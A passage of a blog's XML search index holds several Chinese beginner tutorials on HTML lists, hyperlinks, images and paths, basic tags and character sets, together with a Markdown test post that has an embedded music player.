src="/images/hblyx.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第五篇博客</title>
      <link href="/2021/01/05/di-wu-pian-bo-ke/"/>
      <url>/2021/01/05/di-wu-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML列表"><a href="#HTML列表" class="headerlink" title="HTML列表"></a>HTML列表</h1><a id="more"></a><p>HTML中，列表共有三种:有序列表、无序列表和定义列表。</p><h2 id="1-有序列表-ol-li"><a href="#1-有序列表-ol-li" class="headerlink" title="1.有序列表(ol li)"></a>1.有序列表(ol li)</h2><h3 id="1-1定义"><a href="#1-1定义" class="headerlink" title="1.1定义"></a>1.1定义</h3><p>有序列表的各个列表项是有顺序的，有先后顺序，一般采用数字或者字母作为顺序，默认采用数字顺序。</p><h3 id="1-2语法"><a href="#1-2语法" class="headerlink" title="1.2语法"></a>1.2语法</h3><p><img src="/images/yx.png"></p><h3 id="1-3有序列表的type属性"><a href="#1-3有序列表的type属性" class="headerlink" title="1.3有序列表的type属性"></a>1.3有序列表的type属性</h3><p>ol type=”符号类型”<br>type属性取值<br>1.type=1 列表项序号类型：1、2、3…(默认)<br>2.type=a 列表项序号类型：a、b、c…<br>3.type=A 列表项序号类型：A、B、C…<br>4.type=i 列表项序号类型：i、ii、iii…<br>5.type=l 列表项序号类型：I、II、III…</p><p>例如:<br><img src="/images/yxlb.png"><br>运行结果<br><img src="/images/yxlbyx.png"></p><h3 id="1-4有序列表的start属性"><a href="#1-4有序列表的start属性" class="headerlink" title="1.4有序列表的start属性"></a>1.4有序列表的start属性</h3><p>start属性规定有序列表的开始点。<br><img src="/images/st.png"></p><h2 id="2-无序列表-ul-li"><a href="#2-无序列表-ul-li" class="headerlink" title="2.无序列表(ul li)"></a>2.无序列表(ul li)</h2><h3 id="2-1定义"><a href="#2-1定义" class="headerlink" title="2.1定义"></a>2.1定义</h3><p>无序列表的列表项是没有顺序的。</p><h3 id="2-2语法"><a href="#2-2语法" class="headerlink" title="2.2语法"></a>2.2语法</h3><p><img src="/images/wx.png"></p><h3 id="2-3无序列表的type属性"><a href="#2-3无序列表的type属性" class="headerlink" title="2.3无序列表的type属性"></a>2.3无序列表的type属性</h3><p>ol type=”符号类型”<br>type属性取值<br>type=disc 列表项序号类型：实心圆(默认)<br>type=circle 列表项序号类型：空心圆<br>type=square 列表项序号类型：实心正方形 </p><p>例如:<br><img src="/images/wxt.png"><br>运行结果:<br><img src="/images/wxyx.png"></p><h2 id="3-定义列表-dl-dt-dd"><a href="#3-定义列表-dl-dt-dd" class="headerlink" title="3.定义列表(dl dt dd)"></a>3.定义列表(dl dt dd)</h2><h3 id="3-1定义"><a href="#3-1定义" class="headerlink" title="3.1定义"></a>3.1定义</h3><p>定义列表由定义条件和定义描述组成。</p><h3 id="3-2语法"><a href="#3-2语法" class="headerlink" title="3.2语法"></a>3.2语法</h3><p><img src="/images/dy.png"></p><h3 id="3-3无序列表例子"><a href="#3-3无序列表例子" class="headerlink" title="3.3无序列表例子"></a>3.3无序列表例子</h3><p>例如:<br><img src="/images/dyys.png"><br>运行结果:<br><img src="/images/dyjg.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第四篇博客</title>
      <link href="/2021/01/05/di-si-pian-bo-ke/"/>
      <url>/2021/01/05/di-si-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML超链接"><a href="#HTML超链接" class="headerlink" title="HTML超链接"></a>HTML超链接</h1><a id="more"></a><h2 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h2><p>超链接(hypelink),网页中最常见的元素。每个网站都是由众多的网页组成，网页之间通过链接方式相互关联的。超链接，方便页面之间的跳转。</p><h2 id="2-分类"><a href="#2-分类" class="headerlink" title="2.分类"></a>2.分类</h2><p>超链接有外部、内部、电子邮件、锚点、脚本链接和空连接。</p><h2 id="3-a标签（超链接使用a标签来表示）"><a href="#3-a标签（超链接使用a标签来表示）" class="headerlink" title="3.a标签（超链接使用a标签来表示）"></a>3.a标签（超链接使用a标签来表示）</h2><h3 id="3-1语法"><a href="#3-1语法" class="headerlink" title="3.1语法"></a>3.1语法</h3><p>&lt; a href=”链接地址” &gt;超链接文字&lt; /a &gt;<br>href属性表示链接地址，也就是超链接点击后跳转到的地址。<br><img src="/images/a.png"><br>点击文字跳到这个链接地址</p><h3 id="3-2a标签的target属性"><a href="#3-2a标签的target属性" class="headerlink" title="3.2a标签的target属性"></a>3.2a标签的target属性</h3><p>&lt; a href=”链接地址” target=”目标窗口的打开方式”&gt;文字&lt; /a &gt;<br>1._self(默认方式，在当前窗口打开链接)<br>2._blank(在一个全新的空白窗口打开链接)<br>3._top(在顶层框架中打开链接)<br>4._parent(在当前框架的上一层里打开链接)</p><h3 id="3-3a标签的name属性"><a href="#3-3a标签的name属性" class="headerlink" title="3.3a标签的name属性"></a>3.3a标签的name属性</h3><p>name 属性用于指定锚（anchor）的名称。<br>name 属性可以创建（大型）文档内的书签。<br>例如:<br><img src="/images/md.png"><br>运行结果:<br><img src="/images/mdyx.png"><br>点击链接滚动条就会滚动到相应的模块，name也可以换成id，id是元素的名称，跟name属性一样。</p><h3 id="3-4例子"><a href="#3-4例子" class="headerlink" title="3.4例子"></a>3.4例子</h3><p>1.文字链接<br>例如:<br><img src="/images/a.png"><br>运行结果:<br><img src="/images/aw.png"></p><p>2.图片链接<br>例如:<br><img src="/images/tplj.png"><br>运行结果:<br><img src="/images/tpyx.png"></p><p>3.内部链接<br>例如:<br><img src="/images/nb.png"><br>运行结果:<br><img src="/images/nbyx.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> -html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三篇博客</title>
      <link href="/2021/01/04/di-san-pian-bo-ke/"/>
      <url>/2021/01/04/di-san-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML图像img"><a href="#HTML图像img" class="headerlink" title="HTML图像img"></a>HTML图像img</h1><a id="more"></a><h2 id="1-定义"><a href="#1-定义" class="headerlink" title="1.定义"></a>1.定义</h2><h3 id="1-1-lt-img-gt-定义"><a href="#1-1-lt-img-gt-定义" class="headerlink" title="1.1 &lt; img &gt;定义"></a>1.1 &lt; img &gt;定义</h3><p>1.在HTML中，图像由&lt; img &gt;标签定义。<br>2.&lt; img &gt;是空标签，也就是说它只包含属性，并且没有闭合标签。(没有闭合标签的标签被称作为空标签。)<br>3.从技术上来说，图像不会插入到HTML中，而是链接到HTML页面上。&lt; img &gt;标签的作用是为被引用的图像创建占位符。</p><h2 id="2-lt-img-gt-标签语法格式"><a href="#2-lt-img-gt-标签语法格式" class="headerlink" title="2.&lt; img &gt;标签语法格式"></a>2.&lt; img &gt;标签语法格式</h2><h3 id="2-1-lt-img-gt-标签"><a href="#2-1-lt-img-gt-标签" class="headerlink" title="2.1 &lt; img &gt;标签"></a>2.1 &lt; img &gt;标签</h3><p>&lt; img src=”被引用图像的地址” alt=”图像的替代文本”&gt;</p><p>1.src:是用来指定图像文件地址。<br>2.alt:图像显示不出来时的提示文字。</p><h2 id="3-lt-img-gt-标签属性"><a href="#3-lt-img-gt-标签属性" class="headerlink" title="3.&lt; img &gt;标签属性"></a>3.&lt; img &gt;标签属性</h2><h3 id="3-1-src属性-lt-img-gt-标签必须属性"><a href="#3-1-src属性-lt-img-gt-标签必须属性" class="headerlink" title="3.1 src属性(&lt; img &gt;标签必须属性)"></a>3.1 src属性(&lt; img &gt;标签必须属性)</h3><p>显示图像的url(URL指图像文件的路径，可以为相对路径也可以为绝对路径)</p><h3 id="3-2-alt属性-lt-img-gt-标签必须属性"><a href="#3-2-alt属性-lt-img-gt-标签必须属性" class="headerlink" title="3.2 alt属性(&lt; img &gt;标签必须属性)"></a>3.2 alt属性(&lt; img &gt;标签必须属性)</h3><p>用来描述图片信息，当图像在浏览器显示不出来时，浏览器将显示文本。(信息给搜索引擎看)<br>例如:<br><img src="/images/src.png"><br>运行结果:<br><img src="/images/srcyx.png"></p><h3 id="3-3-title属性"><a href="#3-3-title属性" class="headerlink" title="3.3 title属性"></a>3.3 title属性</h3><p>用于设置鼠标移到图片上的提示文字(给用户看)<br>例如:<br><img src="/images/salt.png"><br>运行结果:<br><img src="/images/saltyx.jpg"></p><h3 id="3-4-width属性和height属性"><a href="#3-4-width属性和height属性" class="headerlink" title="3.4 width属性和height属性"></a>3.4 width属性和height属性</h3><p>height：图像的高度；<br>width：图像的宽度；<br>例如:<br><img src="/images/kg.png"><br>运行结果:<br><img src="/images/kgyx.png"></p><h2 id="4-路径"><a href="#4-路径" class="headerlink" title="4.路径"></a>4.路径</h2><p><img src="/images/xm.png"></p><h3 id="4-1相对路径"><a href="#4-1相对路径" class="headerlink" title="4.1相对路径"></a>4.1相对路径</h3><p>以引用文件网页所在位置作为参考基础，而建立出来的目录路径。<br>1.”./“ ：代表文件所在的目录（可以省略不写）<br>2.”../“ ：代表文件所在的父级目录<br>3.”../../“ ：代表文件所在的父级目录的父级目录<br>4.”/“ ：代表文件所在的根目录<br><img src="/images/xd.png"></p><h3 id="4-2绝对路径-完整的路径"><a href="#4-2绝对路径-完整的路径" class="headerlink" title="4.2绝对路径(完整的路径)"></a>4.2绝对路径(完整的路径)</h3><p>以web站点根目录为参考基础的目录路径。<br><img src="/images/jd.png"></p><h3 id="4-3例子"><a href="#4-3例子" class="headerlink" title="4.3例子"></a>4.3例子</h3><ol><li><p>例1<br><img src="/images/l1.png"></p></li><li><p>例2<br><img src="/images/l2.png"></p></li><li><p>例3<br><img src="/images/l3.png"></p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> -html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二篇博客</title>
      <link href="/2021/01/03/di-er-pian-bo-ke/"/>
      <url>/2021/01/03/di-er-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML基本标签"><a href="#HTML基本标签" class="headerlink" title="HTML基本标签"></a>HTML基本标签</h1><a id="more"></a><h2 id="1-标签的分类"><a href="#1-标签的分类" class="headerlink" title="1.标签的分类"></a>1.标签的分类</h2><h3 id="分类1"><a href="#分类1" class="headerlink" title="分类1"></a>分类1</h3><p>1.自闭合标签<br>单标签(hr、br、input)</p><p>2.闭合标签<br>双标签(p、h1、body)</p><h3 id="分类2"><a href="#分类2" class="headerlink" title="分类2"></a>分类2</h3><p>1.块级标签<br>独占一行,可以自行设置宽高。(div、p、h1~h6)</p><p>2.内联标签<br>按内容占位，高度和宽度由内容填充。(a、img、br)</p><h4 id="判断块级和内联标签的方法："><a href="#判断块级和内联标签的方法：" class="headerlink" title="判断块级和内联标签的方法："></a>判断块级和内联标签的方法：</h4><ol><li>是否独占一行。(可以通过设置背景颜色去判断)</li><li>是否可以单独为元素设置高度和宽度。</li></ol><h2 id="2-文本标签"><a href="#2-文本标签" class="headerlink" title="2.文本标签"></a>2.文本标签</h2><p>1.斜体标签i、cite、em(文本实现斜体)<br>例如:<br><img src="/images/xtbq.png"><br>运行结果:<br><img src="/images/xtyx.png"></p><p>2.粗体标签b、strong(尽量用strong,比b更具有语义性)<br>例如:<br><img src="/images/ct.png"><br>运行结果:<br><img src="/images/ctyx.png"></p><p>3.删除线标签s(删除不再准确信息)<br>例如:<br><img src="/images/scx.png"><br>运行结果:<br><img src="/images/scxyx.png"></p><p>4.下划线标签u(对文本实现下划线)<br>例如:<br><img src="/images/xhx.png"><br>运行结果:<br><img src="/images/xhxyx.png"></p><p>5.span标签(行内元素)<br>用来组合文档中的行内元素，span没有固定的格式表现。当对它应用样式时，它会产生视觉上的变化。</p><p>6.div标签(块元素)<br> 可定义文档中的分区或节，标签可以把文档分割为独立的、不同的部分。它可以用作严格的组织工具，并且不使用任何格式与其关联。</p><h4 id="可以通俗地理解为div为大容器，span为小容器。"><a href="#可以通俗地理解为div为大容器，span为小容器。" class="headerlink" title="可以通俗地理解为div为大容器，span为小容器。"></a>可以通俗地理解为div为大容器，span为小容器。</h4><h2 id="3-标题标签h1-h6-标题标签的级别越高，字体越大"><a href="#3-标题标签h1-h6-标题标签的级别越高，字体越大" class="headerlink" title="3.标题标签h1~h6(标题标签的级别越高，字体越大)"></a>3.标题标签h1~h6(标题标签的级别越高，字体越大)</h2><p>h1~h6标签可定义标题，h1定义最大的标题,h6定义最小的标题。<br>例如:<br><img src="/images/h.png"><br>运行结果:<br><img src="/images/hyx.png"></p><h2 id="4-段落标签p-标记文字"><a href="#4-段落标签p-标记文字" class="headerlink" title="4.段落标签p(标记文字)"></a>4.段落标签p(标记文字)</h2><p>p标签不可以嵌套其他块级标签，嵌套p标签也不行。<br> 例如:<br><img src="/images/p.png"><br>运行结果:<br><img src="/images/pyx.png"></p><h2 id="5-水平线标签hr"><a href="#5-水平线标签hr" class="headerlink" title="5.水平线标签hr"></a>5.水平线标签hr</h2><p>hr指的是horizon(水平线)<br> 例如:<br><img src="/images/spx.png"><br>运行结果:<br><img src="/images/spxyx.png"></p><h2 id="6-转义字符串-指ASCII中的十进制27，十六进制1B，八进制033所定义的那个字符-后面都需要加”-”"><a href="#6-转义字符串-指ASCII中的十进制27，十六进制1B，八进制033所定义的那个字符-后面都需要加”-”" class="headerlink" title="6.转义字符串(指ASCII中的十进制27，十六进制1B，八进制033所定义的那个字符)(后面都需要加”;”)"></a>6.转义字符串(指ASCII中的十进制27，十六进制1B，八进制033所定义的那个字符)(后面都需要加”;”)</h2><p>例如:<br><img src="/images/zy.png"><br>运行结果:<br><img src="/images/zyyx.png"></p><ol><li>&amp;nbsp(空格) 不换行空格，该空格占据宽度受字体影响明显而强烈。</li><li>&amp;emsp(“全角空格”)它叫“全角空格”，全称是Em Space，其占据的宽度正好是1个中文宽度，基本上不受字体影响。</li><li>&amp;copy(版权符号)</li><li>&amp;gt(右半括号 &lt; )</li><li>&amp;lt(左半括号 &gt;)</li><li>&amp;yen(￥ 人民币符号)</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> -html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一篇博客</title>
      <link href="/2021/01/03/di-yi-pian-bo-ke/"/>
      <url>/2021/01/03/di-yi-pian-bo-ke/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML基本知识"><a href="#HTML基本知识" class="headerlink" title="HTML基本知识"></a>HTML基本知识</h1><a id="more"></a><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>HTML是用来描述网页的一种语言，是超文本标记语言: HyperText Markup Language，不是一种编程语言，而是一种标记语言，使用标记标签来描述网页，HTML 文档包含了HTML 标签及文本内容，HTML文档也叫做 web 页面。<br>扩展名：.html　　.htm</p><h2 id="2-html和-html的区别"><a href="#2-html和-html的区别" class="headerlink" title="2.html和.html的区别"></a>2.html和.html的区别</h2><p>HTM是超文本标记Hypertext Markup</p><p>HTML是超文本标记语言Hypertext Markup Language</p><p>没有本质的区别。.htm是在win32时代，系统只能识别3位扩展名时使用的。现在一般都使用.html。(win32指的是操作系统的32位环境)</p><h2 id="3-HTML基本结构"><a href="#3-HTML基本结构" class="headerlink" title="3.HTML基本结构"></a>3.HTML基本结构</h2><p>html基本结构<br> <img src="/images/html.png"><br> 运行结果如下<br> <img src="/images/yxjg.png"></p><p>DOCTYPE html：声明为HTML5文档</p><p>html：是文档的开始标记和结束的标记。是HTML页面的根元素，在它们之间是文档的头部(head)和主体(body)</p><p>head：定义了HTML文档的开头部分。它们之间的内容不会在浏览器的文档窗口显示。包含了文档的元(meta)数据。</p><p>title：定义了网页标题，在浏览器标题栏显示</p><p>body：之间的文本是可见的网页主体内容</p><p>meta:设置标签属性,设置字符编码。(utf-8、gb2312)</p><h2 id="4-字符集charset"><a href="#4-字符集charset" class="headerlink" title="4.字符集charset"></a>4.字符集charset</h2><p>charset 属性规定 HTML 文档的字符编码。 </p><ol><li>ansi:是Windows95及之前的windows系统中默认的字符集。自从 ANSI 成为 Windows 中默认的字符集，所有的浏览器都支持ANSI。(Windows95是一个混合的16位/32位Windows操作系统)</li><li>gbk:是指中国的中文字符，包含了简体中文与繁体中文字符。</li><li>gb2312:仅能存储简体中文字符，国际汉字码（国内用，简体中文）</li><li>utf-8:又称万国码，一般显示简体中文字、繁体中文字、英文、日文、韩文均支持。(国际通用)</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> -html </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二</title>
      <link href="/2021/01/02/wo-de-di-er-pian-wen-zhang/"/>
      <url>/2021/01/02/wo-de-di-er-pian-wen-zhang/</url>
      
        <content type="html"><![CDATA[<h1 id="我的博客文章编写"><a href="#我的博客文章编写" class="headerlink" title="我的博客文章编写"></a>我的博客文章编写</h1><a id="more"></a><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><p>使用标题是用#</p><h2 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h2><p>这是一个段落内容</p><p>这是第二个段落内容</p><h2 id="区块引用"><a href="#区块引用" class="headerlink" title="区块引用"></a>区块引用</h2><p>这是一段引用段落，将会被高亮显示</p><h2 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h2><p><a href="https://www.baidu.com/?tn=18029102_2_dg">百度</a> </p><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p><img src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1588620919,359805583&fm=26&gp=0.jpg" alt="风景"> </p><h2 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h2><ul><li>无序列表项</li><li>无序列表项</li><li>无序列表项 <h2 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h2></li></ul><ol><li>有序列表1</li><li>有序列表2</li><li>有序列表3 <h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2></li></ol><hr><hr><hr><hr><hr><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=516728102&auto=1&height=66"></iframe>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
